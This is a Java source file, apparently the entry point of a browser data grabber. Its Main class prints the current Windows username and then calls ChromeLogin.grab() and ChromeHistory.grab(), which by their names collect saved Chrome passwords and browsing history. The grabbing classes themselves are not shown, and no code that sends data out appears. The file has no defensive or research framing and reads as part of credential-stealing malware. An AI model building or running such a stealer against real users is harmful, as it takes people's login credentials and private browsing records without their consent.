package ninja.maki;

import ninja.maki.grabber.ChromeHistory;
import ninja.maki.grabber.ChromeLogin;
import ninja.maki.utils.SystemUtil;

public class Main {
    public static void main(String[] args){
        SystemUtil.console("Starting program.");
        SystemUtil.console();
        SystemUtil.console("Current User -> " + System.getenv("USERNAME"));
        ChromeLogin.grab();
        ChromeHistory.grab();
        SystemUtil.console();
        SystemUtil.console("Stop program.");
    }
}
